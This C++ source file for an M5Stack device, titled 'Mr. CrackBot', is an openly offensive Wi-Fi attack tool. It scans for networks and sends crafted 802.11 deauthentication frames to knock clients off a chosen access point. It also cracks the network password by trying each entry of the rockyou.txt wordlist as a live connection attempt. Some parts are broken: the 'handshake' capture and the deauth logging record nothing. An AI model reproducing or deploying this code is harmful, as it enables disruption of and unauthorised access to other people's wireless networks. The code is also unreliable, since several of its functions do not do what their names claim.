#include <M5Stack.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <ArduinoJson.h>

#define ROCKYOU_PATH "/rockyou.txt"

// Define structures and global variables
struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool has_password;
  String password;
};

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Function prototypes
void crackNetworkPassword();
void deauthNetwork();
void handleHandshakes();
void fillDeauthPacket(const String &bssid);
String crackPassword(const String &ssid, const String &bssid);
bool tryPassword(const String &ssid, const String &bssid, const String &password);
void displayNetworkInfo(const NetworkInfo &network);
void loadNetworksFromSD();
void saveNetworksToSD();
void setupFirmware();
void displayMenu();
void scanNetworks();
void selectNetwork();
void showNetworkInfo();
void pwnNetwork();
void enterDeepSleep();
void setPromiscuousMode(bool enable);
void sendDeauthPackets(int count);

// Crack Network Password
void crackNetworkPassword() {
  if (!selectedNetwork.ssid.isEmpty()) {
    selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
    saveNetworksToSD();  // Save the cracked password to SD card
    displayNetworkInfo(selectedNetwork);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

// Deauthenticate Network
void deauthNetwork() {
  if (!selectedNetwork.ssid.isEmpty()) {
    setPromiscuousMode(true);
    fillDeauthPacket(selectedNetwork.bssid);
    sendDeauthPackets(10);
    setPromiscuousMode(false);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

// Handle Handshakes
void handleHandshakes() {
  if (selectedNetwork.ssid.isEmpty()) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
    return;
  }

  setPromiscuousMode(true);
  fillDeauthPacket(selectedNetwork.bssid);

  File handshakeLog = SD.open("/handshake.log", FILE_WRITE);
  if (handshakeLog) {
    for (int i = 0; i < 10; ++i) {
      esp_wifi_80211_tx(WIFI_IF_AP, (void *)deauthPacket, sizeof(deauthPacket), false);
      delay(50);  // Reduced delay to prevent flooding and improve performance
    }
    handshakeLog.close();
  } else {
    Serial.println("Failed to open handshake.log.");
  }

  setPromiscuousMode(false);
}

// Fill Deauth Packet
void fillDeauthPacket(const String &bssid) {
  for (int i = 0; i < 6; ++i) {
    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
    deauthPacket[16 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// Crack the network password
String crackPassword(const String &ssid, const String &bssid) {
  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
  if (!rockyouFile) {
    Serial.println("Failed to open rockyou.txt.");
    return "";
  }

  String password;
  String line;
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Cracking Password...");
  
  while (rockyouFile.available()) {
    line = rockyouFile.readStringUntil('\n');
    line.trim();  // Remove any trailing newline characters
    if (tryPassword(ssid, bssid, line)) {
      password = line;
      break;
    }
    M5.Lcd.print(".");
  }

  rockyouFile.close();
  return password;
}

// Try a password for the given network
bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());

  // Disconnect from any network
  WiFi.disconnect(true);
  delay(100);

  // Attempt to connect to the Wi-Fi network
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
    delay(200);  // Reduce delay to make the loop more responsive
    Serial.print(".");
  }
  
  bool isConnected = (WiFi.status() == WL_CONNECTED);
  
    if (isConnected) {
    Serial.println("Connected!");
    WiFi.disconnect(); // Disconnect after successful connection
    return true;
  } else {
    Serial.println("Failed to connect.");
    return false;
  }
}

// Display network information
void displayNetworkInfo(const NetworkInfo &network) {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.printf("SSID: %s\n", network.ssid.c_str());
  M5.Lcd.printf("BSSID: %s\n", network.bssid.c_str());
  M5.Lcd.printf("RSSI: %d dBm\n", network.rssi);
  M5.Lcd.printf("Channel: %d\n", network.channel);
  M5.Lcd.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
  if (network.has_password) {
    M5.Lcd.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
  }
}

// Load network information from SD card
void loadNetworksFromSD() {
  File file = SD.open("/networks.json", FILE_READ);
  if (!file) {
    Serial.println("Failed to open networks.json.");
    return;
  }
  
  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.println("Failed to parse JSON.");
    file.close();
    return;
  }
  
  networks.clear();
  for (JsonObject network : doc["networks"].as<JsonArray>()) {
    NetworkInfo net;
    net.ssid = network["ssid"].as<String>();
    net.bssid = network["bssid"].as<String>();
    net.rssi = network["rssi"].as<int>();
    net.channel = network["channel"].as<int>();
    net.has_password = network["has_password"].as<bool>();
    net.password = network["password"].as<String>();
    networks.push_back(net);
  }
  
  file.close();
}

// Save network information to SD card
void saveNetworksToSD() {
  File file = SD.open("/networks.json", FILE_WRITE);
  if (!file) {
    Serial.println("Failed to open networks.json for writing.");
    return;
  }

  DynamicJsonDocument doc(2048);
  JsonArray netArray = doc.createNestedArray("networks");
  for (const NetworkInfo &net : networks) {
    JsonObject netObj = netArray.createNestedObject();
    netObj["ssid"] = net.ssid;
    netObj["bssid"] = net.bssid;
    netObj["rssi"] = net.rssi;
    netObj["channel"] = net.channel;
    netObj["has_password"] = net.has_password;
    netObj["password"] = net.password;
  }

  if (serializeJson(doc, file) == 0) {
    Serial.println("Failed to write JSON to file.");
  }

  file.close();
}

// Setup firmware
void setupFirmware() {
  // Add your firmware setup code here
}

// Display menu
void displayMenu() {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(3);
  M5.Lcd.println("Mr. CrackBot Menu");
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("A: Scan Networks");
  M5.Lcd.println("B: Select Network");
  M5.Lcd.println("C: Show Network Info");
  M5.Lcd.println("Hold A: Pwn Network");
  M5.Lcd.println("Hold B: Crack Password");
  M5.Lcd.println("Hold C: Deauth Network");
}

// Scan for available networks
void scanNetworks() {
  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.println("No networks found.");
  } else {
    networks.clear();
    for (int i = 0; i < n; ++i) {
      NetworkInfo net;
      net.ssid = WiFi.SSID(i);
      net.bssid = WiFi.BSSIDstr(i);
      net.rssi = WiFi.RSSI(i);
      net.channel = WiFi.channel(i);
      net.has_password = false;  // By default, assume no password
      networks.push_back(net);
    }
    saveNetworksToSD();  // Save scanned networks to SD card
    M5.Lcd.println("Networks scanned and saved.");
  }
}

// Select a network from the list
void selectNetwork() {
  if (networks.empty()) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No networks to select.");
    return;
  }

  int selectedIndex = 0;
  bool selectionConfirmed = false;

  while (!selectionConfirmed) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.setTextSize(2);

    // Display network list with current selection highlighted
    for (int i = 0; i < networks.size(); ++i) {
      if (i == selectedIndex) {
        M5.Lcd.setTextColor(RED);
      } else {
        M5.Lcd.setTextColor(WHITE);
      }
      M5.Lcd.printf("%d: %s\n", i + 1, networks[i].ssid.c_str());
    }

    // Navigate the list using buttons
    if (M5.BtnA.wasPressed()) {
      selectedIndex = (selectedIndex - 1 + networks.size()) % networks.size();  // Move up
    } else if (M5.BtnC.wasPressed()) {
      selectedIndex = (selectedIndex + 1) % networks.size();  // Move down
    } else if (M5.BtnB.wasPressed()) {
      selectionConfirmed = true;  // Confirm selection
    }

    delay(200);  // Debounce delay
  }

  selectedNetwork = networks[selectedIndex];
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Network selected:");
  displayNetworkInfo(selectedNetwork);
}

// Show the information of the selected network
void showNetworkInfo() {
  if (!selectedNetwork.ssid.isEmpty()) {
    displayNetworkInfo(selectedNetwork);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

// Pwn the selected network
void pwnNetwork() {
  if (!selectedNetwork.ssid.isEmpty()) {
    handleHandshakes();
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

// Enter deep sleep mode
void enterDeepSleep() {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Entering deep sleep...");
  delay(1000);
  M5.Lcd.clear();
  esp_deep_sleep_start();
}

// Set promiscuous mode
void setPromiscuousMode(bool enable) {
  esp_wifi_set_promiscuous(enable);
  if (enable) {
    esp_wifi_set_channel(selectedNetwork.channel, WIFI_SECOND_CHAN_NONE);
  }
}

// Send deauth packets
void sendDeauthPackets(int count) {
  File deauthLog = SD.open("/deauth.log", FILE_WRITE);
  if (deauthLog) {
    for (int i = 0; i < count; ++i) {
      esp_wifi_80211_tx(WIFI_IF_AP, (void *)deauthPacket, sizeof(deauthPacket), false);
      delay(10);
    }
    deauthLog.close();
  } else {
    Serial.println("Failed to open deauth.log.");
  }
}

// Setup function
void setup() {
  M5.begin();
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);

  M5.Lcd.clear();
  M5.Lcd.setTextSize(3);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Mr. CrackBot");
  M5.Lcd.println("by @$K");
  delay(3000);

  if (!SD.begin()) {
    Serial.println("SD Card Mount Failed");
    return;
  }

  loadNetworksFromSD();  // Load networks from SD card on startup
  setupFirmware();
  displayMenu();
}

// Main loop
void loop() {
  M5.update();
  if (M5.BtnA.wasPressed()) {
    scanNetworks();
  } else if (M5.BtnB.wasPressed()) {
    selectNetwork();
  } else if (M5.BtnC.wasPressed()) {
    showNetworkInfo();
  } else if (M5.BtnA.pressedFor(2000)) {
    pwnNetwork();
  } else if (M5.BtnB.pressedFor(2000)) {
    crackNetworkPassword();
  } else if (M5.BtnC.pressedFor(2000)) {
    deauthNetwork();
  }

  // Example of handling deep sleep
  if (M5.BtnA.pressedFor(5000)) {
    enterDeepSleep();
  }
}
